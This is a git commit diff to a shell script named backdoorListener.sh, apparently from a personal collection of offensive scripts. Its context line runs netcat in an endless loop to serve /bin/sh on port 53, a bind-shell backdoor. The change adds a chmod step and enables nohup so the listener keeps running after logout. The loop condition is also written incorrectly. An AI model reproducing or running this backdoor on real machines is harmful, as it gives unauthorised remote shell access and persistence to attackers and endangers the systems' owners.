4d062f3fc1c082babdc394a42c33238e3d7f5ed9
binarybytes <31395956+binarybytes@users.noreply.github.com>
2020-05-11 21:32:06 -0400

    Update backdoorListener.sh

--- scriptz/backdoorListener.sh
+++ scriptz/backdoorListener.sh
@@ -3,6 +3,9 @@
 
 while [1]; do echo "commence"; nc -l -p 53 -e /bin/sh; done
 
+#change script/file perms to R+X to run as script:
+chmod 555 listener.sh
+
 #run nohup (ignore logout signal)
-#nohup ./listener.sh
+nohup ./listener.sh
 
